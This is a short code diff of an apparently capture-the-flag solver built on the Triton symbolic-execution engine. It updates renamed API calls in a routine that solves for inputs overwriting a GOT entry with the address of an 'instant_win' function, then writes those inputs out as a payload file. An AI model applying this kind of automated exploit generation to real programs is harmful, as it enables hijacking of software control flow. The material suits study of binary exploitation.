@@ -31,7 +31,7 @@ def solve():
     try:
         m = Triton.getModel(
                 astCtxt.equal(
-                    Triton.buildSymbolicMemory(MemoryAccess(elf.get_symbol('got').value + 3 * 8, CPUSIZE.QWORD)),
+                    Triton.getMemoryAst(MemoryAccess(elf.get_symbol('got').value + 3 * 8, CPUSIZE.QWORD)),
                     astCtxt.bv(elf.get_symbol('instant_win').value, CPUSIZE.QWORD_BIT)
                 ),
             )
@@ -45,7 +45,7 @@ def solve():
             for k, v in m.items():
                 inputs[k] = chr(v.getValue())
                 crash_inputs[k] = chr(v.getValue())
-                Triton.setConcreteSymbolicVariableValue(Triton.getSymbolicVariableFromId(k), v.getValue()) # update concate memory
+                Triton.setConcreteVariableValue(Triton.getSymbolicVariableFromId(k), v.getValue()) # update concate memory
             print 'Crash Inputs: %r' % ''.join(crash_inputs)
             with open(PAYLOAD_FILE, 'wb') as f:
                 f.write(''.join(crash_inputs))
